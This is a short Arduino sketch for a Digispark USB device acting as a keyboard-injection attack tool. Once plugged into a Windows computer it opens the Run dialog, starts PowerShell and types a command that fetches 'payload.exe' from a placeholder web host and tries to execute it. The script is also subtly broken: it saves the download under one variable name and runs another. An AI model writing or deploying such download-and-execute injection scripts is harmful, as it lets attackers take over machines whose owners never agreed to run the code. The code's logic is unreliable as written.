#include "DigiKeyboard.h"
void setup() {
   DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("$result = Invoke-WebRequest -Uri 'https://yoursite.org/payload.exe'");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(750);
  DigiKeyboard.print("powershell.exe -nop -e $client.content");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

}

void loop() {
 
}
